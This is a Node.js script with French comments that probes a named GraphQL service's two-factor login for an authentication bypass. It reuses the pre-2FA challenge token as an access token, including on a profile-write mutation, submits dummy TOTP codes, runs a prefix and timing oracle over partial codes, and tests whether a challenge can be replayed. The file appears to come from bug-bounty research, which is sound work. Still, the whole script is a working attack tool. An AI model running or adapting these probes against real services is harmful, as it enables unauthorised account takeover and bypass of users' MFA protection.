import fs from "fs";
const AS = "https://bugsecure-api.senintel.sn";
const EP = AS + "/graphql";
const CH = process.env.CHALLENGE;
const T = process.env.BB_TOKEN; // jeton de session (pre-2FA) pour comparer
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const call = async (q, v, bearer) => {
  const r = await fetch(EP, { method: "POST", headers: { "Content-Type": "application/json", ...(bearer ? { Authorization: "Bearer " + bearer } : {}) }, body: JSON.stringify({ query: q, variables: v || {} }) });
  const t = await r.text(); let j = null; try { j = JSON.parse(t); } catch {}
  return { s: r.status, t, j };
};
const show = (l, r, m = 260) => console.log("  " + l.padEnd(56) + "HTTP " + r.s + "  " + (r.j?.errors ? "ERR: " + r.j.errors.map((x) => x.message).join(" | ") : JSON.stringify(r.j?.data)).slice(0, m));

console.log("=== 0) claims du challengeToken ===");
try { console.log("  " + JSON.stringify(JSON.parse(Buffer.from(CH.split(".")[1], "base64url").toString()))); } catch (e) { console.log("  " + e.message); }

console.log("\n=== 1) TEST CRITIQUE : le challengeToken sert-il de jeton d acces ? (bypass MFA complet) ===");
for (const [n, q] of [
  ["me", "{ me { id username roles twoFactorEnabled } }"],
  ["reports", "{ reports(take:3){ id title status } }"],
  ["myKycStatus", "{ myKycStatus { status } }"],
  ["updateResearcherProfile (ecriture)", "mutation{ updateResearcherProfile(input:{bio:\"bb-mfa-bypass\"}){ id bio } }"],
  ["certificateSigningKeys (public)", "{ certificateSigningKeys { keys { kid } } }"],
]) { show("challengeToken comme Bearer : " + n, await call(q, {}, CH)); await sleep(1000); }

console.log("\n=== 2) le challengeToken remplace-t-il l accessToken dans l en-tete ? (variantes) ===");
show("Authorization: Bearer <challenge> + X-BugSecure-Session: cookie", await call("{ me { id username } }", {}, CH));
await sleep(1000);
show("challengeToken comme access_token de session (refresh)", await fetch(AS + "/api/auth/session/refresh", { method: "POST", headers: { "Content-Type": "application/json", "X-BugSecure-Session": CH, Cookie: "bounty-session=" + CH }, body: "{}" }).then(async (r) => ({ s: r.status, j: null, t: (await r.text()).slice(0, 150) })));

console.log("\n=== 3) PATTERN 3 : code 2FA manifestement faux ===");
show("verify2fa(code=000000)", await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken user { id } } }`, { i: { challengeToken: CH, token: "000000" } }));
await sleep(1200);
show("verify2fa(code=1)", await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken } }`, { i: { challengeToken: CH, token: "1" } }));
await sleep(1200);
show("verify2fa(token vide)", await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken } }`, { i: { challengeToken: CH, token: "" } }));
await sleep(1200);
show("verify2fa(sans token)", await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken } }`, { i: { challengeToken: CH } }));
await sleep(1200);

console.log("\n=== 4) PATTERN 4 : ORACLE DE PREFIXE (le code est-il valide prefixe par prefixe ?) ===");
for (const c of ["0", "00", "000", "0000", "00000", "1", "12", "123", "1234", "2", "23", "234", "5", "6", "7", "8", "9"]) {
  const t0 = Date.now();
  const r = await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken } }`, { i: { challengeToken: CH, token: c } });
  const dt = Date.now() - t0;
  const m = r.j?.errors?.map((x) => x.message).join("|") || JSON.stringify(r.j?.data);
  console.log("  token=" + JSON.stringify(c).padEnd(9) + String(dt + "ms").padStart(7) + "  " + String(m).slice(0, 100));
  await sleep(700);
}

console.log("\n=== 5) le challenge est-il consomme apres une tentative ? (rejeu) ===");
show("verify2fa(000000) encore", await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken } }`, { i: { challengeToken: CH, token: "000000" } }));
await sleep(1000);
show("verify2fa(123456)", await call(`mutation($i:VerifyTotpInput!){ verify2fa(input:$i){ accessToken } }`, { i: { challengeToken: CH, token: "123456" } }));
